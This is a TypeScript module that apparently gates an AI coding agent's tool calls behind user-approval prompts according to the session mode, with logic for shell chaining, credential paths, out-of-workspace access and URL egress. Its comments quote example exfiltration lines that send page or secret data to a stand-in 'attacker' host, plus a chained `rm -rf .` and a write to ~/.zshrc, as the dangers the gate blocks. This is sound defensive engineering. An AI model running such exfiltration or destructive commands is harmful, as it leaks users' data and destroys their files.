/**
 * Tool approval: turns a pi tool call into the matching `PermissionRequest` and
 * decides whether the mode needs to ask at all. DEFAULT asks before every
 * mutation; ACCEPTEDITS lets edits through but shell asks; PLAN refuses
 * mutations outright; YOLO never asks. Reads inside the workspace never prompt,
 * reads outside it do, since that is the one read that can leak.
 */
import * as fs from "node:fs";
import * as path from "node:path";

import { resolveEdit, spliceRanges } from "./edit-resolve.js";
import { EXIT_PLAN_TOOL_NAME } from "./exit-plan-tool.js";
import {
  AgentMode,
  type PermissionRequest,
  type ToolRequest,
} from "./protocol.js";
import { isWithin, namedSecretPaths } from "./sandbox/secrets.js";
import { zoneContext, zoneOf } from "./sandbox/zones.js";
import { isInsideDirectory, realPathOf } from "./workspace-path.js";

/** Tools that change something on disk or run code. */
const MUTATING_TOOLS = new Set([
  "write",
  "edit",
  "batch_edit",
  "bash",
  "delete",
  "notebook_edit",
  "ast_edit",
  "run_tests",
  // A URL is an outbound channel, so plan mode refuses it and it never
  // auto-allows. See gateWebFetch.
  "web_fetch",
  // Code execution like bash, and an outbound channel wider than web_fetch:
  // `fetch('http://host/?d=' + document.body.innerText)` is a line of it.
  "browser_execute",
  // Every tool that hands work to a sub-agent, which runs without the
  // permission gate (delegation.ts) with its own bash and write. Gating the
  // parent call is enough: in plan mode the call never happens.
  "delegate_task",
  "document",
  "ppt",
  "design",
  "browser_task",
  // `serve` puts a directory on an http port, an outbound channel carrying
  // whatever is in it; an absolute path reaches anywhere the user can read.
  "serve",
  // Not sub-agents, but both take a path from the model and the host writes
  // to it, anywhere on disk.
  "pdf",
  "deck_export_pdf",
  // A fetch and a write at once, and what lands is text this agent will then
  // follow.
  "skill_add",
]);

/**
 * Tools whose sub-agent runs unsupervised, listed so the ask can say so:
 * approved once, they act many times without coming back.
 */
const SUBAGENT_TOOLS = new Set([
  "delegate_task",
  "document",
  "ppt",
  "design",
  "browser_task",
]);

/**
 * Shell syntax that lets a command do more than the approved prefix:
 * separators, pipes, substitution, redirection, newlines. Any of them means no
 * auto-allow: `git status` must not approve `git status; rm -rf .`. Redirection
 * because the prefix is the first word (see rememberAllowance) and
 * `git status >> ~/.zshrc` writes any file on disk; `<` because `<(cmd)` is
 * process substitution. A redirect prompting once is the right way to be wrong.
 */
const SHELL_CHAINING = /[;|&`\n<>]|\$\(/;

/**
 * The separators a chain is broken on before each part is checked on its own.
 * Without this an approval could never cover `cd repo && git pull`, which is
 * how the agent writes almost every command, and "Always" changed nothing.
 * Safe because every part still has to clear {@link SHELL_CHAINING} and match
 * an approved prefix. Quoting is not parsed: a separator inside a string
 * splits into parts matching no prefix, so a wrong parse only costs a prompt.
 */
const CHAIN_SEPARATOR = /&&|\|\||;/;

/** The parts of a chained command, in order, with the empties dropped. */
export function shellSegments(command: string): string[] {
  return command
    .split(CHAIN_SEPARATOR)
    .map((segment) => segment.trim())
    .filter((segment) => segment.length > 0);
}

export type Gate =
  /** `credentialPaths`: hidden stores the user already approved, to unhide. */
  | { kind: "allow"; credentialPaths?: string[] }
  /** Refused outright without asking: PLAN mode's answer to a mutation. */
  | { kind: "refuse"; reason: string }
  | { kind: "ask"; request: PermissionRequest };

export interface GateOptions {
  mode: AgentMode;
  cwd: string;
  /** Literal command prefixes the user has pre-approved for this session. */
  allowedCommands: readonly string[];
  /** Non-bash tools the user chose to always allow for this session. */
  allowedTools: readonly string[];
  /** Directories outside the workspace already allowed for reads. */
  allowedReadPaths: readonly string[];
  /** Directories outside the workspace already allowed for writes. */
  allowedWritePaths: readonly string[];
  /** Origins the user chose to always allow web_fetch for, this session. */
  allowedOrigins: readonly string[];
  /** Credential stores the sandbox hides that a command may ask to read. */
  promptableCredentialPaths?: readonly string[];
  /** Hidden stores the user chose to always allow reading, this session. */
  allowedCredentialPaths?: readonly string[];
}

export function isMutatingTool(toolName: string): boolean {
  return MUTATING_TOOLS.has(toolName);
}

/**
 * Whether THIS call mutates: a multi-action tool can be a mutation one way and
 * a lookup another, so the gate asks about a call rather than a name.
 */
export function isMutatingCall(tool: ToolRequest): boolean {
  // Only `serve start` exposes anything; refusing `list` in plan mode would
  // stop the agent seeing what it already put on a port.
  if (tool.name === "serve")
    return String(tool.input.action ?? "start") === "start";

  return isMutatingTool(tool.name);
}

export function gateToolCall(tool: ToolRequest, options: GateOptions): Gate {
  const { mode } = options;

  // Full access means exactly that: no prompts and no sandbox.
  if (mode === AgentMode.Yolo) return { kind: "allow" };

  // Auto skips the approval prompts, not the sandbox: a hidden credential
  // store a command names is still the OS refusing, and still worth a card.
  // A file tool leaving the workspace follows the same rule as a confined
  // command (sandbox/intent.ts): a new file in the user's own folders is
  // fine, touching an existing one or a sensitive place asks.
  if (mode === AgentMode.Auto) {
    if (tool.name === "bash")
      return credentialGate(tool, options) ?? { kind: "allow" };
    if (WRITE_TOOLS.has(tool.name)) return autoWriteGate(tool, options);

    return { kind: "allow" };
  }

  // The one call plan mode must let through: it is how the user is asked to
  // leave it, or the mode is inescapable from the inside.
  if (tool.name === EXIT_PLAN_TOOL_NAME) {
    if (mode !== AgentMode.PlanMode) {
      return {
        kind: "refuse",
        reason: "Not in plan mode. You can already make changes, so go ahead.",
      };
    }

    const plan =
      typeof (tool.input as { plan?: unknown })?.plan === "string"
        ? (tool.input as { plan: string }).plan
        : "";

    return {
      kind: "ask",
      request: {
        type: "exit_plan_mode",
        tool,
        displayName: "Implement the plan",
        // Nothing writes a plan to disk here; the path is part of the shared
        // request shape, and the desktop hides the line when it is empty.
        planFilePath: "",
        planContent: plan,
      },
    };
  }

  if (mode === AgentMode.PlanMode && isMutatingCall(tool)) {
    return {
      kind: "refuse",
      reason:
        "Plan mode is read-only: no file changes and no shell commands. " +
        "Investigate and write the plan. When it is ready and the user wants it done, " +
        "call exit_plan_mode to ask to start: that is how the mode changes. " +
        "Do not ask them to flip a switch themselves.",
    };
  }

  // bash and web_fetch have their own, narrower allowance stores; a blanket
  // tool-level "always allow" would approve every command and every host.
  if (
    tool.name !== "bash" &&
    tool.name !== "web_fetch" &&
    options.allowedTools.includes(tool.name)
  ) {
    return { kind: "allow" };
  }

  switch (tool.name) {
    // Read-only tools that take a path can still reach outside the workspace.
    // `glob` is the desktop's name for pi's `find` (TOOL_NAME_ALIASES).
    case "read":
    case "batch_file_read":
    case "grep":
    case "find":
    case "glob":
    case "ls":
      return gateRead(tool, options);
    case "edit":
    case "batch_edit":
    case "write":
    case "notebook_edit":
    case "ast_edit":
      // Containment first, then the mode; see gateWrite. AcceptEdits waves
      // through an edit inside the workspace, not one anywhere on disk.
      return gateWrite(tool, options);
    case "bash":
      return gateBash(tool, options);
    case "serve":
      return gateServe(tool, options);
    case "web_fetch":
      return gateWebFetch(tool, options);
    default:
      // Unknown mutating tools are caught by MUTATING_TOOLS; everything else
      // runs without a prompt, matching pi's own default.
      return isMutatingCall(tool)
        ? { kind: "ask", request: buildGenericRequest(tool) }
        : { kind: "allow" };
  }
}

/**
 * Fetching a URL is egress, not a read: the model chooses the whole URL, and
 * everything the agent has seen can be packed into a query string, so it must
 * not be that `read .env` prompts while `web_fetch("http://attacker/?d=...")`
 * does not. Plan mode refuses it outright, since read-only has to hold for the
 * user's secrets and not just their files. Approval is per origin: three pages
 * of one docs site should not be three prompts.
 */
function gateWebFetch(tool: ToolRequest, options: GateOptions): Gate {
  const raw = String(tool.input.url ?? "");

  let origin: string;
  try {
    origin = new URL(raw).origin;
  } catch {
    // Unparseable never reaches the network (the fetch itself refuses it),
    // so let it through to fail with a message the model can act on.
    return { kind: "allow" };
  }

  if (options.allowedOrigins.includes(origin)) {
    return { kind: "allow" };
  }

  return {
    kind: "ask",
    request: {
      type: "fetch_url",
      tool,
      displayName: "Fetch a URL",
      // The full URL, never a summary: an exfiltration payload sits in the
      // query string, so truncating would hide the part worth looking at.
      url: raw,
      origin,
    },
  };
}

/**
 * A write, edited or whole, and where it lands. AcceptEdits means "I trust this
 * agent with my project", not with my home directory, so containment is checked
 * first and separately from the mode: a write inside the workspace is waved
 * through, one outside asks in every mode but Yolo, as the
 * `write_outside_directory` / `edit_outside_directory` request types.
 */
const WRITE_TOOLS = new Set([
  "write",
  "edit",
  "batch_edit",
  "notebook_edit",
  "ast_edit",
]);

/** Where a file tool's path lands, resolved for the card and the check. */
function writeTarget(
  tool: ToolRequest,
  options: GateOptions
): { requested: string; resolved: string; inside: boolean } {
  const requested = String(tool.input.path ?? tool.input.notebookPath ?? "");
  const resolved = pathToShow(
    path.resolve(options.cwd, requested),
    options.cwd
  );
  const inside =
    isInside(resolved, options.cwd) ||
    options.allowedWritePaths.some((dir) => isInside(resolved, dir));

  return { requested, resolved, inside };
}

/** The card for a file tool leaving the workspace. */
function outsideWriteRequest(
  tool: ToolRequest,
  requested: string,
  resolved: string
): PermissionRequest {
  const base = {
    tool,
    filePath: requested,
    resolvedPath: resolved,
    deducedDirectory: path.dirname(resolved),
  };

  if (tool.name === "write") {
    return {
      ...base,
      type: "write_outside_directory",
      displayName: "Write file outside the workspace",
      isNewFile: !fs.existsSync(resolved),
    };
  }

  return {
    ...base,
    type:
      tool.name === "notebook_edit"
        ? "notebook_edit_outside_directory"
        : "edit_outside_directory",
    displayName: "Edit file outside the workspace",
  };
}

/**
 * Auto's answer for a file tool: inside the workspace, scratch, or a tool
 * home, go ahead; a NEW file in the user's own folders too, since "save it on
 * my Desktop" is the request; anything else outside asks, because changing
 * or replacing what is already there is what the user would want to hear
 * about first.
 */
function autoWriteGate(tool: ToolRequest, options: GateOptions): Gate {
  const { requested, resolved, inside } = writeTarget(tool, options);
  if (inside) return { kind: "allow" };

  const zone = zoneOf(resolved, zoneContext(options.cwd));
  if (zone === "workspace" || zone === "scratch" || zone === "toolhome")
    return { kind: "allow" };
  if (zone === "user" && tool.name === "write" && !fs.existsSync(resolved))
    return { kind: "allow" };

  return {
    kind: "ask",
    request: outsideWriteRequest(tool, requested, resolved),
  };
}

function gateWrite(tool: ToolRequest, options: GateOptions): Gate {
  const { requested, resolved, inside } = writeTarget(tool, options);

  if (!inside) {
    return {
      kind: "ask",
      request: outsideWriteRequest(tool, requested, resolved),
    };
  }

  if (options.mode === AgentMode.AcceptEdits) {
    return { kind: "allow" };
  }

  switch (tool.name) {
    case "edit":
    case "batch_edit":
      return { kind: "ask", request: buildEditRequest(tool, options.cwd) };
    case "write":
      return { kind: "ask", request: buildWriteRequest(tool, options.cwd) };
    default:
      return { kind: "ask", request: buildGenericRequest(tool) };
  }
}

/**
 * Putting a directory on an http port. The card names the directory because
 * that is the whole question: `serve` takes an absolute path, so the page just
 * written and the user's home directory are the same call.
 */
function gateServe(tool: ToolRequest, options: GateOptions): Gate {
  if (String(tool.input.action ?? "start") !== "start") {
    return { kind: "allow" };
  }

  const requested = String(tool.input.directory ?? "");

  return {
    kind: "ask",
    request: {
      type: "generic",
      tool,
      displayName: `Serve ${path.resolve(options.cwd, requested)} over http`,
      toolName: tool.name,
      inputSummary: summarize(tool.input),
    },
  };
}

function gateRead(tool: ToolRequest, options: GateOptions): Gate {
  // Every path in a batch read has to clear the same bar, or ten files at once
  // would be a way around the prompt one at a time would raise.
  const paths = Array.isArray(tool.input.paths)
    ? (tool.input.paths as unknown[]).map(String)
    : [String(tool.input.path ?? "")];

  const outside = paths.find((candidate) => {
    const resolved = path.resolve(options.cwd, candidate);
    return (
      !isInside(resolved, options.cwd) &&
      !options.allowedReadPaths.some((dir) => isInside(resolved, dir))
    );
  });

  if (outside === undefined) {
    return { kind: "allow" };
  }

  const requested = outside;
  // Approving "link.ts" tells the user nothing, and the directory offered must
  // be where the bytes really live or the approval misses the next read.
  const resolved = pathToShow(
    path.resolve(options.cwd, requested),
    options.cwd
  );

  return {
    kind: "ask",
    request: {
      type: "read_outside_directory",
      tool,
      displayName: "Read file outside the workspace",
      filePath: requested,
      resolvedPath: resolved,
      deducedDirectory: path.dirname(resolved),
    },
  };
}

/** The hidden stores a command names, split by whether the session allowed them. */
function namedCredentialStores(
  command: string,
  options: GateOptions
): { named: string[]; approved: string[]; unapproved: string[] } {
  const named = namedSecretPaths(command, {
    cwd: options.cwd,
    promptable: options.promptableCredentialPaths ?? [],
  });
  const allowedStores = options.allowedCredentialPaths ?? [];
  const approved = named.filter((store) =>
    allowedStores.some((allowed) => isWithin(store, allowed))
  );

  return {
    named,
    approved,
    unapproved: named.filter((store) => !approved.includes(store)),
  };
}

/**
 * The card for a command that names a hidden credential store the session has
 * not allowed, or the allowance to unhide the ones it has; null when the
 * command names none.
 */
function credentialGate(tool: ToolRequest, options: GateOptions): Gate | null {
  const command = String(tool.input.command ?? "");
  const { named, approved, unapproved } = namedCredentialStores(
    command,
    options
  );
  if (named.length === 0) return null;
  if (unapproved.length === 0)
    return { kind: "allow", credentialPaths: approved };

  return {
    kind: "ask",
    request: {
      type: "run_terminal",
      tool,
      displayName: "Run command",
      command,
      cwd: options.cwd,
      background: tool.input.background === true,
      credentialPaths: named,
    },
  };
}

function gateBash(tool: ToolRequest, options: GateOptions): Gate {
  const command = String(tool.input.command ?? "");

  // A hidden credential store the command names asks even when the command
  // prefix was approved: `cat` being allowed says nothing about the key.
  const { named, approved, unapproved } = namedCredentialStores(
    command,
    options
  );

  const segments = shellSegments(command);

  if (
    unapproved.length === 0 &&
    segments.length > 0 &&
    segments.every(
      (segment) =>
        !SHELL_CHAINING.test(segment) &&
        options.allowedCommands.some(
          (prefix) => segment === prefix || segment.startsWith(`${prefix} `)
        )
    )
  ) {
    return approved.length > 0
      ? { kind: "allow", credentialPaths: approved }
      : { kind: "allow" };
  }

  return {
    kind: "ask",
    request: {
      type: "run_terminal",
      tool,
      displayName: "Run command",
      command,
      cwd: options.cwd,
      // `bash` can background a command too; the card must say so.
      background: tool.input.background === true,
      ...(named.length > 0 ? { credentialPaths: named } : {}),
    },
  };
}

function buildEditRequest(tool: ToolRequest, cwd: string): PermissionRequest {
  const filePath = String(tool.input.path ?? "");
  const original = readFileSafe(path.resolve(cwd, filePath));
  // `edit` carries one change as plain arguments; `batch_edit` carries many in
  // `edits`. The preview has to understand both.
  const edits = Array.isArray(tool.input.edits)
    ? (tool.input.edits as Array<{
        oldText?: string;
        newText?: string;
        replaceAll?: boolean;
      }>)
    : typeof tool.input.oldText === "string"
      ? [
          {
            oldText: tool.input.oldText,
            newText:
              typeof tool.input.newText === "string" ? tool.input.newText : "",
            replaceAll: tool.input.replaceAll === true,
          },
        ]
      : [];

  return {
    type: "edit_file",
    tool,
    displayName: "Edit file",
    filePath,
    originalContent: original,
    newContent: applyEdits(original, edits),
  };
}

function buildWriteRequest(tool: ToolRequest, cwd: string): PermissionRequest {
  const filePath = String(tool.input.path ?? "");
  const absolute = path.resolve(cwd, filePath);
  const exists = fs.existsSync(absolute);

  return {
    type: "write_file",
    tool,
    displayName: exists ? "Overwrite file" : "Create file",
    filePath,
    originalContent: exists ? readFileSafe(absolute) : "",
    content: String(tool.input.content ?? ""),
    isNewFile: !exists,
  };
}

function buildGenericRequest(tool: ToolRequest): PermissionRequest {
  return {
    type: "generic",
    tool,
    // A sub-agent acts many times off one approval, so the card says so.
    displayName: SUBAGENT_TOOLS.has(tool.name)
      ? `${tool.name} (runs unsupervised)`
      : tool.name,
    toolName: tool.name,
    inputSummary: summarize(tool.input),
  };
}

/**
 * Preview an edit so the approval prompt can show a real diff. Each edit is
 * resolved through the same cascade the edit tool uses, or the diff approved is
 * not the diff written. Every `oldText` matches the ORIGINAL file, not the
 * previous edit's result. An edit that cannot be resolved is left alone: the
 * tool raises the real error, and a half-applied preview is worse than none.
 */
function applyEdits(
  original: string,
  edits: ReadonlyArray<{
    oldText?: string;
    newText?: string;
    replaceAll?: boolean;
  }>
): string {
  const patches: Array<{ start: number; end: number; text: string }> = [];

  for (const edit of edits) {
    const oldText = edit.oldText ?? "";
    const newText = edit.newText ?? "";

    if (!oldText) {
      continue;
    }

    const resolved = resolveEdit(
      original,
      oldText,
      newText,
      edit.replaceAll === true
    );

    if (!resolved.ok) {
      continue;
    }

    for (const range of resolved.ranges) {
      patches.push({ ...range, text: newText });
    }
  }

  // Index splicing, never String.replace: `$&` and friends in a replacement
  // string are pattern syntax to replace() and would corrupt the preview.
  return spliceRanges(original, patches);
}

function readFileSafe(absolutePath: string): string {
  try {
    return fs.readFileSync(absolutePath, "utf8");
  } catch {
    return "";
  }
}

/**
 * The path to show in an out-of-workspace prompt. Usually the plain resolved
 * path (`/etc/hosts`, not macOS's `/private/etc/hosts`). The exception is a
 * path that LOOKS inside the workspace but leaves it through a link: there
 * `link.ts` says nothing about `/etc/hosts`, so the real target is shown.
 */
function pathToShow(lexical: string, cwd: string): string {
  const relative = path.relative(path.resolve(cwd), lexical);
  const looksInside =
    relative === "" ||
    (!relative.startsWith("..") && !path.isAbsolute(relative));

  // Only the label; when the path will not resolve there is nothing better to
  // show than what the model asked for. The gate itself refuses separately.
  return looksInside ? (realPathOf(lexical) ?? lexical) : lexical;
}

/**
 * Containment with symlinks followed: a link inside the workspace that points
 * outside it is outside it.
 */
function isInside(candidate: string, directory: string): boolean {
  return isInsideDirectory(candidate, directory);
}

function summarize(input: Record<string, unknown>): string {
  const summary = JSON.stringify(input);

  return summary.length > 400 ? `${summary.slice(0, 400)}…` : summary;
}

/** The modes a user can name, for help text and error messages. */
export const MODE_NAMES = [
  "default",
  "acceptedits",
  "plan",
  "auto",
  "yolo",
] as const;

/**
 * A mode name, or null when it is not one. `parseMode` falls back to Normal
 * because on the wire an unknown mode is version skew; from a person it is a
 * typo, and a silent fallback gives `--mode planing` a writable session that
 * the header line calls read-only.
 */
export function parseModeStrict(raw: string | undefined): AgentMode | null {
  switch ((raw ?? "").trim().toUpperCase()) {
    case "DEFAULT":
    case "NORMAL":
      return AgentMode.Normal;
    case "ACCEPTEDITS":
      return AgentMode.AcceptEdits;
    case "PLAN":
      return AgentMode.PlanMode;
    case "AUTO":
      return AgentMode.Auto;
    case "YOLO":
      return AgentMode.Yolo;
    default:
      return null;
  }
}

export function parseMode(raw: string | undefined): AgentMode {
  return parseModeStrict(raw) ?? AgentMode.Normal;
}
